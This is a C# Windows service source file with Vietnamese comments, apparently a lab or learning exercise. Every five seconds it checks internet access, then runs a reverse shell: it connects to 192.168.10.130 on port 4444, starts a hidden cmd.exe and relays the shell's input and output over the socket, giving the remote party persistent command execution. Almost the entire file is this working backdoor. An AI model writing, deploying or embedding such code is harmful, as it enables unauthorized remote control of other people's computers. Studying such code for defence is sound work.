using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.IO;
using System.Net.NetworkInformation;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;


namespace WindowsService3
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer();
        static StreamWriter streamWriter;
        public Service1()
        {
            InitializeComponent();
        }
      
        // Bắt đầu Service
        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; //number in milisecinds 
            timer.Enabled = true;
        }
        // Hàm này sẽ thực hiện khi dừng Service
        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }

        public static bool CheckForInternetConnection()
        {
            // Kiểm tra kết nối đến Internet bằng cách ping Google
            string host = "8.8.8.8";        
            Ping icmp = new Ping();
            
                // Nếu quá 5s không nhận được reply thì xem như không có kết nối
                PingReply reply = icmp.Send(host, 5000);
                if (reply.Status == IPStatus.Success)
                {
                    return true;
                }  
                else
                {
                return false;
                }          
        }

        // import hàm Getconsolewindow() từ kernel32.dll.
        [DllImport("kernel32.dll")]
        // trả về một con trỏ tới cửa sổ hiện tại của console.
        static extern IntPtr Getconsolewindow();
        


        public static void ReverseShell()
        {

            // Thực hiện kết nối đến địa chỉ IP và cổng cụ thể (ở đây là 192.168.10.130 và 4444),
            try
            {
                // TcpClient : Lớp được sử dụng để tạo một kết nối TCP tới một máy khác qua mạng.
                using (TcpClient client = new TcpClient(hostname: "192.168.10.130", port: 4444))
                {
                    // Sử dụng đối tượng Stream để tạo luồng truyền thông giữa client và server
                    using (Stream stream = client.GetStream())
                    {
                        // StreamReader để đọc dữ liệu được truyền từ server đến client.
                        using (StreamReader SR = new StreamReader(stream))
                        {
                            // StreamWriter để ghi dữ liệu vào "stream"
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            // Khai báo và khởi tạo một đối tượng Process để thực thi chương trình cmd.exe.
                       
                            // sử dụng luồng đầu vào/đầu ra chuẩn để giao tiếp với chương trình cmd.exe).
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            // thiết lập các thuộc tính của nó 
                            //không tạo cửa sổ mới
                            p.StartInfo.CreateNoWindow = true;
                            //không sử dụng Shell để thực thi
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            // Thiết lập một sự kiện để xử lý dữ liệu đầu ra từ chương trình cmd.exe
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            // đọc dữ liệu đầu ra bằng cách gọi phương thức BeginOutputReadLine().
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                // đọc dữ liệu được truyền từ server đến client bằng đối tượng StreamReader
                                strInput.Append(SR.ReadLine());
                                // gửi dữ liệu đó vào luồng đầu vào chuẩn của chương trình cmd.exe 
                                p.StandardInput.WriteLine(strInput);
                                // gửi dữ liệu đó vào luồng đầu vào chuẩn của chương trình cmd.exe bằng phương thức
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            catch
            {
                // bruh
            }
        }

        // Xử lý dữ liệu đầu ra từ chương trình cmd.exe và ghi dữ liệu này vào luồng để gửi về server.
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outline)
        {
            // "Output" lưu trữ dữ liệu đầu ra từ chương trình cmd.exe.
            StringBuilder Output = new StringBuilder();
            // Kiểm tra xem dữ liệu đầu ra có hợp lệ hay không
            if (!String.IsNullOrEmpty(outline.Data))
            {
                try
                {
                    // Thêm dữ liệu đầu ra vào đối tượng StringBuilder.
                    Output.Append(outline.Data);
                    // Ghi dữ liệu đó vào luồng
                    streamWriter.WriteLine(Output);
                    // đảm bảo rằng dữ liệu được ghi vào luồng  ngay lập tức.
                    streamWriter.Flush();
                }
                catch(Exception e)
                {
                    
                }
            }
        }

      


        // Mỗi 5s sẽ thực hiện hàm này
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            if(CheckForInternetConnection()==true)
            {
                WriteToFile("INTERNET IS WORKING FINE ! ");
                ReverseShell();
                WriteToFile("CONNECT FOR MEEEEEEEEEEEEEEEE ! ");
            }
            else
            {
                WriteToFile("There is NO INTERNET OTL ! ");
            }
        }

   

        //Ghi vào logs
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            //Nếu chưa có đường dẫn đến nơi chứa logs thì tạo
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            // đường dẫn của logs
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" +
           DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to. 
                // Tạo logs và ghi vào đó
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}